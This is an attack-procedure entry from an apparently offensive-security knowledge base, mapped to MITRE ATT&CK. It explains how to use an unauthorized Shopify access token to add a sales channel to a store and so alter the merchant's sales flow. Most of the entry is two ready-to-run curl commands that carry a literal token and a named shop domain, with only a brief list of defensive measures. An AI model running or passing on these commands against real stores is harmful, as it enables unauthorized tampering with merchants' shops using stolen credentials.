---
tags:
  - shopify
  - api-creation
  - channels
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-add-channel]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.741Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 0d8a9cfe-0d7f-4627-8337-0e819b00f188
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Add-Shopify-Sales-Channel

## Summary

This procedure creates a new sales channel via the beta API using the unauthorized token, allowing injection of malicious or unwanted configurations.

## Description

A POST request to /admin/channels.json with parameters like channel[provider_id] adds a new channel, bypassing controls and potentially enabling unauthorized sales routing or further exploits.

## Requirements

1. Access token with write_channels scope
2. Provider ID for the new channel (e.g., 12 for a specific type)
3. Target shop domain

## Defense

Defensive measures and detection strategies:

- Validate all channel creations against allowlists
- Log POSTs to beta APIs with full payload
- Require admin approval for new channels
- Scan for anomalous channel additions

## Objectives

1. Inject new sales channel
2. Alter merchant sales flow
3. Prove complete API control

## Instructions

### Step 1: Create New Channel

**Context**: POST the channel data with provider_id.

**Command** ([[commands/shopify-add-channel]]):
```bash
curl -X POST -H "X-Shopify-Access-Token: 77a01fc64f65fd16b0b38bc31694e4ce" "https://while42.myshopify.com/admin/channels.json" -d "channel[provider_id]=12"
```

> Returns JSON with the new channel object.

### Step 2: Verify Addition

**Context**: List channels to confirm the new one.

**Command** (Follow with GET):
```bash
curl -H "X-Shopify-Access-Token: 77a01fc64f65fd16b0b38bc31694e4ce" "https://while42.myshopify.com/admin/channels.json"
```

> Expected: New channel in the list.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-add-channel]]

## Tools Used


## Tags

- [[shopify]]
- [[api-creation]]
- [[channels]]
